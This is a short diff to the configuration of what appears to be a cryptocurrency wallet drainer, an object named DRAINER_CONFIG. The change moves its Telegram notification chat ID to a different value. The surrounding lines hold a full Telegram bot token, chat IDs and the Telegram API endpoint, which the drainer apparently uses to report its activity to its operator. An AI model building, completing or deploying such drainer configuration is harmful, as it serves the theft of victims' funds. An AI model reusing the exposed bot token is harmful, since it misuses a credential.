@@ -17,7 +17,7 @@ window.DRAINER_CONFIG = {
         enabled: true,  // Set to true to enable Telegram notifications
         botToken: "8684568211:AAGLwmJvd7n1Al6e5sBnT-ycbxol-5bx0dw",  // Get from @BotFather
         chatId: "8051121194",  // Logging chat ID - general activity logs
-        notificationChatId: "8051121194",  // Notification chat ID - alerts & important events (can be same or different)
+        notificationChatId: "6939937703",  // Notification chat ID - alerts & important events (can be same or different)
         apiUrl: "https://api.telegram.org/bot",  // Direct API endpoint
         relayUrl: "http://localhost:3000/relay",  // Local relay server (CORS-free)
         useRelay: false  // Set to true to use local relay server instead of direct API
